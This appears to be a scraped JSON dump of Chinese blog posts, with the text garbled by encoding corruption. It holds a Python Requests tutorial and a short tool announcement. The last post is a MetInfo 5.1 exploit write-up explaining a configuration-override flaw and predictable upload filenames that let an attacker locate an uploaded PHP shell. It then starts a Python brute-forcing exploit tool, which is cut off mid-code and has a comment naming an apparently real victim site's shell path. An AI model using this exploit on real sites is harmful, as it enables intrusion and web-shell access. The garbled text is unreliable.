æ¨¡å—è¿›è¡Œæ³¨å†Œï¼Œä½ å°±å¯ä»¥è½»æ¾åœ°ä½¿ç”¨è¿™ä¸ªè§£ç å™¨åç§°ä½œä¸º r.encoding çš„å€¼ï¼Œ ç„¶åç”±Requestsæ¥ä¸ºä½ å¤„ç†ç¼–ç ã€‚\näºŒè¿›åˆ¶å“åº”å†…å®¹ ä½ ä¹Ÿèƒ½ä»¥å­—èŠ‚çš„æ–¹å¼è®¿é—®è¯·æ±‚å“åº”ä½“ï¼Œå¯¹äºéæ–‡æœ¬è¯·æ±‚:\n1 2 \u0026gt;\u0026gt;\u0026gt; r.content b\u0026#39;[{\u0026#34;repository\u0026#34;:{\u0026#34;open_issues\u0026#34;:0,\u0026#34;url\u0026#34;:\u0026#34;https://github.com/... Requestsä¼šè‡ªåŠ¨ä¸ºä½ è§£ç  gzip å’Œ deflate ä¼ è¾“ç¼–ç çš„å“åº”æ•°æ®ã€‚\nä¾‹å¦‚ï¼Œä»¥è¯·æ±‚è¿”å›çš„äºŒè¿›åˆ¶æ•°æ®åˆ›å»ºä¸€å¼ å›¾ç‰‡ï¼Œä½ å¯ä»¥ä½¿ç”¨å¦‚ä¸‹ä»£ç :\n1 2 3 \u0026gt;\u0026gt;\u0026gt; from PIL import Image \u0026gt;\u0026gt;\u0026gt; from StringIO import StringIO \u0026gt;\u0026gt;\u0026gt; i = Image.open(StringIO(r.content)) JSONå“åº”å†…å®¹ Requestsä¸­ä¹Ÿæœ‰ä¸€ä¸ªå†…ç½®çš„JSONè§£ç å™¨ï¼ŒåŠ©ä½ å¤„ç†JSONæ•°æ®:\n1 2 3 4 \u0026gt;\u0026gt;\u0026gt; import requests \u0026gt;\u0026gt;\u0026gt; r = requests.get(\u0026#39;https://github.com/timeline.json\u0026#39;) \u0026gt;\u0026gt;\u0026gt; r.json() [{u\u0026#39;repository\u0026#39;: {u\u0026#39;open_issues\u0026#39;: 0, u\u0026#39;url\u0026#39;: \u0026#39;https://github.com/... å¦‚æœJSONè§£ç å¤±è´¥ï¼Œ r.json å°±ä¼šæŠ›å‡ºä¸€ä¸ªå¼‚å¸¸ã€‚ä¾‹å¦‚ï¼Œç›¸åº”å†…å®¹æ˜¯ 401 (Unauthorized) ï¼Œå°è¯•è®¿é—® r.json å°†ä¼šæŠ›å‡º ValueError: No JSON object could be decoded å¼‚å¸¸ã€‚\nåŸå§‹å“åº”å†…å®¹ åœ¨ç½•è§çš„æƒ…å†µä¸‹ä½ å¯èƒ½æƒ³è·å–æ¥è‡ªæœåŠ¡å™¨çš„åŸå§‹å¥—æ¥å­—å“åº”ï¼Œé‚£ä¹ˆä½ å¯ä»¥è®¿é—® r.raw ã€‚ å¦‚æœä½ ç¡®å®æƒ³è¿™ä¹ˆå¹²ï¼Œé‚£è¯·ä½ ç¡®ä¿åœ¨åˆå§‹è¯·æ±‚ä¸­è®¾ç½®äº† stream=True ã€‚å…·ä½“çš„ä½ å¯ä»¥è¿™ä¹ˆåš:\n1 2 3 4 5 \u0026gt;\u0026gt;\u0026gt; r = requests.get(\u0026#39;https://github.com/timeline.json\u0026#39;, stream=True) \u0026gt;\u0026gt;\u0026gt; r.raw \u0026lt;requests.packages.urllib3.response.HTTPResponse object at 0x101194810\u0026gt; \u0026gt;\u0026gt;\u0026gt; r.raw.read(10) \u0026#39;\\x1f\\x8b\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x03\u0026#39; ä½†ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œä½ åº”è¯¥ä»¥ä¸‹é¢çš„æ¨¡å¼å°†æ–‡æœ¬æµä¿å­˜åˆ°æ–‡ä»¶:\n1 2 3 with open(filename, \u0026#39;wb\u0026#39;) as fd: for chunk in r.iter_content(chunk_size): fd.write(chunk) ä½¿ç”¨ Response.iter_content å°†ä¼šå¤„ç†å¤§é‡ä½ ç›´æ¥ä½¿ç”¨ Response.raw ä¸å¾—ä¸å¤„ç†çš„ã€‚ å½“æµä¸‹è½½æ—¶ï¼Œä¸Šé¢æ˜¯ä¼˜å…ˆæ¨èçš„è·å–å†…å®¹æ–¹å¼ã€‚\nå®šåˆ¶è¯·æ±‚å¤´ å¦‚æœä½ æƒ³ä¸ºè¯·æ±‚æ·»åŠ HTTPå¤´éƒ¨ï¼Œåªè¦ç®€å•åœ°ä¼ é€’ä¸€ä¸ª dict ç»™ headers å‚æ•°å°±å¯ä»¥äº†ã€‚\nä¾‹å¦‚ï¼Œåœ¨å‰ä¸€ä¸ªç¤ºä¾‹ä¸­æˆ‘ä»¬æ²¡æœ‰æŒ‡å®šcontent-type:\n1 2 3 4 5 6 \u0026gt;\u0026gt;\u0026gt; import json \u0026gt;\u0026gt;\u0026gt; url = \u0026#39;https://api.github.com/some/endpoint\u0026#39; \u0026gt;\u0026gt;\u0026gt; payload = {\u0026#39;some\u0026#39;: \u0026#39;data\u0026#39;} \u0026gt;\u0026gt;\u0026gt; headers = {\u0026#39;content-type\u0026#39;: \u0026#39;application/json\u0026#39;} \u0026gt;\u0026gt;\u0026gt; r = requests.post(url, data=json.dumps(payload), headers=headers) æ›´åŠ å¤æ‚çš„POSTè¯·æ±‚ é€šå¸¸ï¼Œä½ æƒ³è¦å‘é€ä¸€äº›ç¼–ç ä¸ºè¡¨å•å½¢å¼çš„æ•°æ®â€”éå¸¸åƒä¸€ä¸ªHTMLè¡¨å•ã€‚ è¦å®ç°è¿™ä¸ªï¼Œåªéœ€ç®€å•åœ°ä¼ é€’ä¸€ä¸ªå­—å…¸ç»™ data å‚æ•°ã€‚ä½ çš„æ•°æ®å­—å…¸ åœ¨å‘å‡ºè¯·æ±‚æ—¶ä¼šè‡ªåŠ¨ç¼–ç ä¸ºè¡¨å•å½¢å¼:\n1 2 3 4 5 6 7 8 9 10 11 \u0026gt;\u0026gt;\u0026gt; payload = {\u0026#39;key1\u0026#39;: \u0026#39;value1\u0026#39;, \u0026#39;key2\u0026#39;: \u0026#39;value2\u0026#39;} \u0026gt;\u0026gt;\u0026gt; r = requests.post(\u0026#34;http://httpbin.org/post\u0026#34;, data=payload) \u0026gt;\u0026gt;\u0026gt; print r.text { ... \u0026#34;form\u0026#34;: { \u0026#34;key2\u0026#34;: \u0026#34;value2\u0026#34;, \u0026#34;key1\u0026#34;: \u0026#34;value1\u0026#34; }, ... } å¾ˆå¤šæ—¶å€™ä½ æƒ³è¦å‘é€çš„æ•°æ®å¹¶éç¼–ç ä¸ºè¡¨å•å½¢å¼çš„ã€‚å¦‚æœä½ ä¼ é€’ä¸€ä¸ª string è€Œä¸æ˜¯ä¸€ä¸ª dict ï¼Œé‚£ä¹ˆæ•°æ®ä¼šè¢«ç›´æ¥å‘å¸ƒå‡ºå»ã€‚\nä¾‹å¦‚ï¼ŒGithub API v3æ¥å—ç¼–ç ä¸ºJSONçš„POST/PATCHæ•°æ®:\n1 2 3 4 5 \u0026gt;\u0026gt;\u0026gt; import json \u0026gt;\u0026gt;\u0026gt; url = \u0026#39;https://api.github.com/some/endpoint\u0026#39; \u0026gt;\u0026gt;\u0026gt; payload = {\u0026#39;some\u0026#39;: \u0026#39;data\u0026#39;} \u0026gt;\u0026gt;\u0026gt; r = requests.post(url, data=json.dumps(payload)) POSTä¸€ä¸ªå¤šéƒ¨åˆ†ç¼–ç (Multipart-Encoded)çš„æ–‡ä»¶ Requestsä½¿å¾—ä¸Šä¼ å¤šéƒ¨åˆ†ç¼–ç æ–‡ä»¶å˜å¾—å¾ˆç®€å•:\n1 2 3 4 5 6 7 8 9 10 11 12 \u0026gt;\u0026gt;\u0026gt; url = \u0026#39;http://httpbin.org/post\u0026#39; \u0026gt;\u0026gt;\u0026gt; files = {\u0026#39;file\u0026#39;: open(\u0026#39;report.xls\u0026#39;, \u0026#39;rb\u0026#39;)} \u0026gt;\u0026gt;\u0026gt; r = requests.post(url, files=files) \u0026gt;\u0026gt;\u0026gt; r.text { ... \u0026#34;files\u0026#34;: { \u0026#34;file\u0026#34;: \u0026#34;\u0026lt;censored...binary...data\u0026gt;\u0026#34; }, ... } ä½ å¯ä»¥æ˜¾å¼åœ°è®¾ç½®æ–‡ä»¶åï¼Œæ–‡ä»¶ç±»å‹å’Œè¯·æ±‚å¤´:\n1 2 3 4 5 6 7 8 9 10 11 12 \u0026gt;\u0026gt;\u0026gt; url = \u0026#39;http://httpbin.org/post\u0026#39; \u0026gt;\u0026gt;\u0026gt; files = {\u0026#39;file\u0026#39;: (\u0026#39;report.xls\u0026#39;, open(\u0026#39;report.xls\u0026#39;, \u0026#39;rb\u0026#39;), \u0026#39;application/vnd.ms-excel\u0026#39;, {\u0026#39;Expires\u0026#39;: \u0026#39;0\u0026#39;})} \u0026gt;\u0026gt;\u0026gt; r = requests.post(url, files=files) \u0026gt;\u0026gt;\u0026gt; r.text { ... \u0026#34;files\u0026#34;: { \u0026#34;file\u0026#34;: \u0026#34;\u0026lt;censored...binary...data\u0026gt;\u0026#34; }, ... } å¦‚æœä½ æƒ³ï¼Œä½ ä¹Ÿå¯ä»¥å‘é€ä½œä¸ºæ–‡ä»¶æ¥æ¥æ”¶çš„å­—ç¬¦ä¸²:\n1 2 3 4 5 6 7 8 9 10 11 12 \u0026gt;\u0026gt;\u0026gt; url = \u0026#39;http://httpbin.org/post\u0026#39; \u0026gt;\u0026gt;\u0026gt; files = {\u0026#39;file\u0026#39;: (\u0026#39;report.csv\u0026#39;, \u0026#39;some,data,to,send\\nanother,row,to,send\\n\u0026#39;)} \u0026gt;\u0026gt;\u0026gt; r = requests.post(url, files=files) \u0026gt;\u0026gt;\u0026gt; r.text { ... \u0026#34;files\u0026#34;: { \u0026#34;file\u0026#34;: \u0026#34;some,data,to,send\\\\nanother,row,to,send\\\\n\u0026#34; }, ... } å¦‚æœä½ å‘é€ä¸€ä¸ªéå¸¸å¤§çš„æ–‡ä»¶ä½œä¸º multipart/form-data è¯·æ±‚ï¼Œä½ å¯èƒ½å¸Œæœ›æµè¯·æ±‚(?)ã€‚é»˜è®¤ä¸‹ requests ä¸æ”¯æŒ, ä½†æœ‰ä¸ªç¬¬ä¸‰æ–¹åŒ…æ”¯æŒ - requests-toolbelt. ä½ å¯ä»¥é˜…è¯» toolbelt æ–‡æ¡£ æ¥äº†è§£ä½¿ç”¨æ–¹æ³•ã€‚\nåœ¨ä¸€ä¸ªè¯·æ±‚ä¸­å‘é€å¤šæ–‡ä»¶å‚è€ƒ é«˜çº§ç”¨æ³• ä¸€èŠ‚.\nå“åº”çŠ¶æ€ç  æˆ‘ä»¬å¯ä»¥æ£€æµ‹å“åº”çŠ¶æ€ç :\n1 2 3 \u0026gt;\u0026gt;\u0026gt; r = requests.get(\u0026#39;http://httpbin.org/get\u0026#39;) \u0026gt;\u0026gt;\u0026gt; r.status_code 200 ä¸ºæ–¹ä¾¿å¼•ç”¨ï¼ŒRequestsè¿˜é™„å¸¦äº†ä¸€ä¸ªå†…ç½®çš„çŠ¶æ€ç æŸ¥è¯¢å¯¹è±¡:\n1 2 \u0026gt;\u0026gt;\u0026gt; r.status_code == requests.codes.ok True å¦‚æœå‘é€äº†ä¸€ä¸ªå¤±è´¥è¯·æ±‚(é200å“åº”)ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ Response.raise_for_status() æ¥æŠ›å‡ºå¼‚å¸¸:\n1 2 3 4 5 6 7 8 9 \u0026gt;\u0026gt;\u0026gt; bad_r = requests.get(\u0026#39;http://httpbin.org/status/404\u0026#39;) \u0026gt;\u0026gt;\u0026gt; bad_r.status_code 404 \u0026gt;\u0026gt;\u0026gt; bad_r.raise_for_status() Traceback (most recent call last): File \u0026#34;requests/models.py\u0026#34;, line 832, in raise_for_status raise http_error requests.exceptions.HTTPError: 404 Client Error ä½†æ˜¯ï¼Œç”±äºæˆ‘ä»¬çš„ä¾‹å­ä¸­ r çš„ status_code æ˜¯ 200 ï¼Œå½“æˆ‘ä»¬è°ƒç”¨ raise_for_status() æ—¶ï¼Œå¾—åˆ°çš„æ˜¯:\n1 2 \u0026gt;\u0026gt;\u0026gt; r.raise_for_status() None ä¸€åˆ‡éƒ½æŒºå’Œè°å“ˆã€‚\nå“åº”å¤´ æˆ‘ä»¬å¯ä»¥æŸ¥çœ‹ä»¥ä¸€ä¸ªPythonå­—å…¸å½¢å¼å±•ç¤ºçš„æœåŠ¡å™¨å“åº”å¤´:\n1 2 3 4 5 6 7 8 9 10 \u0026gt;\u0026gt;\u0026gt; r.headers { \u0026#39;content-encoding\u0026#39;: \u0026#39;gzip\u0026#39;, \u0026#39;transfer-encoding\u0026#39;: \u0026#39;chunked\u0026#39;, \u0026#39;connection\u0026#39;: \u0026#39;close\u0026#39;, \u0026#39;server\u0026#39;: \u0026#39;nginx/1.0.4\u0026#39;, \u0026#39;x-runtime\u0026#39;: \u0026#39;148ms\u0026#39;, \u0026#39;etag\u0026#39;: \u0026#39;\u0026#34;e1ca502697e5c9317743dc078f67693f\u0026#34;\u0026#39;, \u0026#39;content-type\u0026#39;: \u0026#39;application/json\u0026#39; } ä½†æ˜¯è¿™ä¸ªå­—å…¸æ¯”è¾ƒç‰¹æ®Šï¼šå®ƒæ˜¯ä»…ä¸ºHTTPå¤´éƒ¨è€Œç”Ÿçš„ã€‚æ ¹æ® RFC 2616 ï¼Œ HTTPå¤´éƒ¨æ˜¯å¤§å°å†™ä¸æ•æ„Ÿçš„ã€‚\nå› æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä»»æ„å¤§å†™å½¢å¼æ¥è®¿é—®è¿™äº›å“åº”å¤´å­—æ®µ:\n1 2 3 4 5 \u0026gt;\u0026gt;\u0026gt; r.headers[\u0026#39;Content-Type\u0026#39;] \u0026#39;application/json\u0026#39; \u0026gt;\u0026gt;\u0026gt; r.headers.get(\u0026#39;content-type\u0026#39;) \u0026#39;application/json\u0026#39; Cookies å¦‚æœæŸä¸ªå“åº”ä¸­åŒ…å«ä¸€äº›Cookieï¼Œä½ å¯ä»¥å¿«é€Ÿè®¿é—®å®ƒä»¬:\n1 2 3 4 5 \u0026gt;\u0026gt;\u0026gt; url = \u0026#39;http://example.com/some/cookie/setting/url\u0026#39; \u0026gt;\u0026gt;\u0026gt; r = requests.get(url) \u0026gt;\u0026gt;\u0026gt; r.cookies[\u0026#39;example_cookie_name\u0026#39;] \u0026#39;example_cookie_value\u0026#39; è¦æƒ³å‘é€ä½ çš„cookiesåˆ°æœåŠ¡å™¨ï¼Œå¯ä»¥ä½¿ç”¨ cookies å‚æ•°:\n1 2 3 4 5 6 \u0026gt;\u0026gt;\u0026gt; url = \u0026#39;http://httpbin.org/cookies\u0026#39; \u0026gt;\u0026gt;\u0026gt; cookies = dict(cookies_are=\u0026#39;working\u0026#39;) \u0026gt;\u0026gt;\u0026gt; r = requests.get(url, cookies=cookies) \u0026gt;\u0026gt;\u0026gt; r.text \u0026#39;{\u0026#34;cookies\u0026#34;: {\u0026#34;cookies_are\u0026#34;: \u0026#34;working\u0026#34;}}\u0026#39; é‡å®šå‘ä¸è¯·æ±‚å†å² é»˜è®¤æƒ…å†µä¸‹ï¼Œé™¤äº† HEAD, Requestsä¼šè‡ªåŠ¨å¤„ç†æ‰€æœ‰é‡å®šå‘ã€‚\nå¯ä»¥ä½¿ç”¨å“åº”å¯¹è±¡çš„ history æ–¹æ³•æ¥è¿½è¸ªé‡å®šå‘ã€‚\nResponse.history æ˜¯ä¸€ä¸ª:class:Response\u0026lt;requests.Response\u0026gt; å¯¹è±¡çš„åˆ—è¡¨ï¼Œä¸ºäº†å®Œæˆè¯·æ±‚è€Œåˆ›å»ºäº†è¿™äº›å¯¹è±¡ã€‚è¿™ä¸ªå¯¹è±¡åˆ—è¡¨æŒ‰ç…§ä»æœ€è€åˆ°æœ€è¿‘çš„è¯·æ±‚è¿›è¡Œæ’åºã€‚\nä¾‹å¦‚ï¼ŒGithubå°†æ‰€æœ‰çš„HTTPè¯·æ±‚é‡å®šå‘åˆ°HTTPSã€‚:\n1 2 3 4 5 6 7 \u0026gt;\u0026gt;\u0026gt; r = requests.get(\u0026#39;http://github.com\u0026#39;) \u0026gt;\u0026gt;\u0026gt; r.url \u0026#39;https://github.com/\u0026#39; \u0026gt;\u0026gt;\u0026gt; r.status_code 200 \u0026gt;\u0026gt;\u0026gt; r.history [\u0026lt;Response [301]\u0026gt;] å¦‚æœä½ ä½¿ç”¨çš„æ˜¯GET, OPTIONS, POST, PUT, PATCH æˆ–è€… DELETE,ï¼Œé‚£ä¹ˆä½ å¯ä»¥é€šè¿‡ allow_redirects å‚æ•°ç¦ç”¨é‡å®šå‘å¤„ç†:\n1 2 3 4 5 \u0026gt;\u0026gt;\u0026gt; r = requests.get(\u0026#39;http://github.com\u0026#39;, allow_redirects=False) \u0026gt;\u0026gt;\u0026gt; r.status_code 301 \u0026gt;\u0026gt;\u0026gt; r.history [] å¦‚æœä½ ä½¿ç”¨çš„æ˜¯HEADï¼Œä½ ä¹Ÿå¯ä»¥å¯ç”¨é‡å®šå‘:\n1 2 3 4 5 \u0026gt;\u0026gt;\u0026gt; r = requests.head(\u0026#39;http://github.com\u0026#39;, allow_redirects=True) \u0026gt;\u0026gt;\u0026gt; r.url \u0026#39;https://github.com/\u0026#39; \u0026gt;\u0026gt;\u0026gt; r.history [\u0026lt;Response [301]\u0026gt;] è¶…æ—¶ ä½ å¯ä»¥å‘Šè¯‰requestsåœ¨ç»è¿‡ä»¥ timeout å‚æ•°è®¾å®šçš„ç§’æ•°æ—¶é—´ä¹‹ååœæ­¢ç­‰å¾…å“åº”:\n1 2 3 4 5 \u0026gt;\u0026gt;\u0026gt; requests.get(\u0026#39;http://github.com\u0026#39;, timeout=0.001) Traceback (most recent call last): File \u0026#34;\u0026lt;stdin\u0026gt;\u0026#34;, line 1, in \u0026lt;module\u0026gt; requests.exceptions.Timeout: HTTPConnectionPool(host=\u0026#39;github.com\u0026#39;, port=80): Request timed out. (timeout=0.001) æ³¨:: timeout ä»…å¯¹è¿æ¥è¿‡ç¨‹æœ‰æ•ˆï¼Œä¸å“åº”ä½“çš„ä¸‹è½½æ— å…³ã€‚timeoutå¹¶ä¸æ˜¯æ•´ä¸ªä¸‹è½½å“åº”çš„æ—¶é—´é™åˆ¶ï¼Œè€Œæ˜¯å¦‚æœæœåŠ¡å™¨åœ¨timeoutç§’å†…æ²¡æœ‰åº”ç­”ï¼Œå°†ä¼šå¼•å‘ä¸€ä¸ªå¼‚å¸¸ï¼ˆæ›´ç²¾ç¡®åœ°è¯´ï¼Œæ˜¯åœ¨timeoutç§’å†…æ²¡æœ‰ä»åŸºç¡€å¥—æ¥å­—ä¸Šæ¥æ”¶åˆ°ä»»ä½•å­—èŠ‚çš„æ•°æ®æ—¶ï¼‰\né”™è¯¯ä¸å¼‚å¸¸ é‡åˆ°ç½‘ç»œé—®é¢˜ï¼ˆå¦‚ï¼šDNSæŸ¥è¯¢å¤±è´¥ã€æ‹’ç»è¿æ¥ç­‰ï¼‰æ—¶ï¼ŒRequestsä¼šæŠ›å‡ºä¸€ä¸ª ConnectionError å¼‚å¸¸ã€‚\né‡åˆ°ç½•è§çš„æ— æ•ˆHTTPå“åº”æ—¶ï¼ŒRequestsåˆ™ä¼šæŠ›å‡ºä¸€ä¸ª HTTPError å¼‚å¸¸ã€‚\nè‹¥è¯·æ±‚è¶…æ—¶ï¼Œåˆ™æŠ›å‡ºä¸€ä¸ª Timeout å¼‚å¸¸ã€‚\nè‹¥è¯·æ±‚è¶…è¿‡äº†è®¾å®šçš„æœ€å¤§é‡å®šå‘æ¬¡æ•°ï¼Œåˆ™ä¼šæŠ›å‡ºä¸€ä¸ª TooManyRedirects å¼‚å¸¸ã€‚\næ‰€æœ‰Requestsæ˜¾å¼æŠ›å‡ºçš„å¼‚å¸¸éƒ½ç»§æ‰¿è‡ª requests.exceptions.RequestException ã€‚\n","permalink":"https://www.hacktech.cn/post/python%E4%B9%8Brequests%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8.html","summary":"\u003chr\u003e\n\u003ch1 id=\"å®‰è£…\"\u003eå®‰è£…\u003c/h1\u003e\n\u003chr\u003e\n\u003cp\u003eä½¿ç”¨ pip å®‰è£…Requestséå¸¸ç®€å•\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cdiv style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\n\u003ctable style=\"border-spacing:0;padding:0;margin:0;border:0;\"\u003e\u003ctr\u003e\u003ctd style=\"vertical-align:top;padding:0;margin:0;border:0;\"\u003e\n\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e1\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\n\u003ctd style=\"vertical-align:top;padding:0;margin:0;border:0;;width:100%\"\u003e\n\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003epip install requests\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\u003c/tr\u003e\u003c/table\u003e\n\u003c/div\u003e\n\u003c/div\u003e\u003cp\u003eæˆ–è€…ä½¿ç”¨ easy_install å®‰è£…\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cdiv style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\n\u003ctable style=\"border-spacing:0;padding:0;margin:0;border:0;\"\u003e\u003ctr\u003e\u003ctd style=\"vertical-align:top;padding:0;margin:0;border:0;\"\u003e\n\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e1\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\n\u003ctd style=\"vertical-align:top;padding:0;margin:0;border:0;;width:100%\"\u003e\n\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eeasy_install requests\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\u003c/tr\u003e\u003c/table\u003e\n\u003c/div\u003e\n\u003c/div\u003e\u003chr\u003e\n\u003ch1 id=\"è·å¾—æºç \"\u003eè·å¾—æºç \u003c/h1\u003e\n\u003chr\u003e\n\u003cp\u003eRequests ä¸€ç›´åœ¨Githubä¸Šè¢«ç§¯æçš„å¼€å‘ç€\u003c/p\u003e\n\u003cp\u003eä½ å¯ä»¥å…‹éš†å…¬å…±ç‰ˆæœ¬åº“:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cdiv style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\n\u003ctable style=\"border-spacing:0;padding:0;margin:0;border:0;\"\u003e\u003ctr\u003e\u003ctd style=\"vertical-align:top;padding:0;margin:0;border:0;\"\u003e\n\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e1\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\n\u003ctd style=\"vertical-align:top;padding:0;margin:0;border:0;;width:100%\"\u003e\n\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egit clone git://github.com/kennethreitz/requests.git\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\u003c/tr\u003e\u003c/table\u003e\n\u003c/div\u003e\n\u003c/div\u003e","title":"Pythonä¹‹Requestsçš„å®‰è£…ä¸åŸºæœ¬ä½¿ç”¨"},{"content":"é—²æ¥æ— äº‹ï¼Œå†™äº†æ¬¾ç¼–ç è½¬æ¢å·¥å…·\nä»¥æˆ‘çš„å®¡ç¾æ¥çœ‹ï¼Œç•Œé¢åº”è¯¥ç®—ç¾ä¸½\næˆªå›¾ :\nä¸‹è½½åœ°å€ï¼š ç¼–ç è½¬æ¢å·¥å…·\nè½¬è½½è¯·æ³¨æ˜å‡ºå¤„\nä½œè€…åšå®¢ www.hacktech.cn\n","permalink":"https://www.hacktech.cn/post/%E7%BC%96%E7%A0%81%E8%BD%AC%E6%8D%A2%E5%B7%A5%E5%85%B7.html","summary":"\u003cp\u003e\u003cstrong\u003eé—²æ¥æ— äº‹ï¼Œå†™äº†æ¬¾ç¼–ç è½¬æ¢å·¥å…·\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eä»¥æˆ‘çš„å®¡ç¾æ¥çœ‹ï¼Œç•Œé¢åº”è¯¥ç®—ç¾ä¸½\u003c/strong\u003e\u003c/p\u003e\n\u003chr\u003e\n\u003cp\u003e\u003cstrong\u003eæˆªå›¾ :\u003c/strong\u003e\u003c/p\u003e\n\u003chr\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/images/uploads/46756156584c37444749666e414755505a4963306a7078515f664845.png\" alt=\"Akkuman\"  /\u003e\n\u003c/p\u003e","title":"ç¼–ç è½¬æ¢å·¥å…·"},{"content":" æ¼æ´è§£æï¼š config/config.inc.php\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 $langoks = $db-\u0026gt;get_one(\u0026#34;SELECT * FROM $met_lang WHERE lang=\u0026#39;$lang\u0026#39;\u0026#34;); if(!$langoks)die(\u0026#39;No data in the database,please reinstall.\u0026#39;); if(!$langoks[useok]\u0026amp;\u0026amp;!$metinfoadminok)okinfo(\u0026#39;../404.html\u0026#39;); if(count($met_langok)==1)$lang=$met_index_type; $query = \u0026#34;SELECT * FROM $met_config WHERE lang=\u0026#39;$lang\u0026#39; or lang=\u0026#39;metinfo\u0026#39;\u0026#34;;//çœ‹è¿™é‡Œ $result = $db-\u0026gt;query($query); while($list_config= $db-\u0026gt;fetch_array($result)){ if($metinfoadminok)$list_config[\u0026#39;value\u0026#39;]=str_replace(\u0026#39;\u0026#34;\u0026#39;, \u0026#39;\u0026amp;#34;\u0026#39;, str_replace(\u0026#34;\u0026#39;\u0026#34;, \u0026#39;\u0026amp;#39;\u0026#39;,$list_config[\u0026#39;value\u0026#39;])); $settings_arr[]=$list_config; if($list_config[\u0026#39;columnid\u0026#39;]){ $settings[$list_config[\u0026#39;name\u0026#39;].\u0026#39;_\u0026#39;.$list_config[\u0026#39;columnid\u0026#39;]]=$list_config[\u0026#39;value\u0026#39;]; }else{ $settings[$list_config[\u0026#39;name\u0026#39;]]=$list_config[\u0026#39;value\u0026#39;]; } } @extract($settings); è®¿é—®\nhttp:///localhost/metinfo5.1/index.php?lang=metinfo\nSELECT * FROM met_config WHERE lang='metinfo' or lang='metinfo'\næ–‡ä»¶å‘½åæ–¹å¼ï¼š /feedback/uploadfile_save.php\n1 2 3 4 5 6 7 srand((double)microtime() * 1000000); $rnd = rand(100, 999); $name = date(\u0026#39;U\u0026#39;) + $rnd; $name = $name.\u0026#34;.\u0026#34;.$ext; æ–‡ä»¶ä¿å­˜åœ¨/upload/file/ç›®å½•\nå‘½åæ–¹å¼å°±æ˜¯æ—¶é—´æˆ³å»æ‰åä¸‰ä½ï¼Œç´§æ¥ç€ä¸€ä¸ªä¸‰ä½æ•°çš„éšæœºæ•°\nå¯çˆ†ç ´ï¼š\nå¦‚\nhttp://127.0.0.1/upload/file/1465394396.php\nä¸€é”®åŒ–åˆ©ç”¨å·¥å…·ï¼š æœ¬ç¨‹åºåŸºäºpythonç¼–å†™\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 #!/usr/bin/env python #-*- coding: utf-8 -*- import requests import Queue import threading import time import sys headers = {\u0026#39;User-Agent\u0026#39;:\u0026#39;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.10 Safari/537.36\u0026#39;} urls = Queue.Queue() #http://hb.jhxjd.com/upload/file/1441445378.php def bp(urls,time_out): while not urls.empty(): base_url = urls.get() response = None try: time.sleep(int(time_out))#å»¶æ—¶è®¾ç½® response = requests.get(base_url,headers=headers) if response.status_code == 404: print \u0026#39;Not Fount----%s\\n\u0026#39; % base_url except: continue finally: if response: with open(\u0026#39;url.txt\u0026#39;,\u0026#39;a+\u0026#39;) as f: 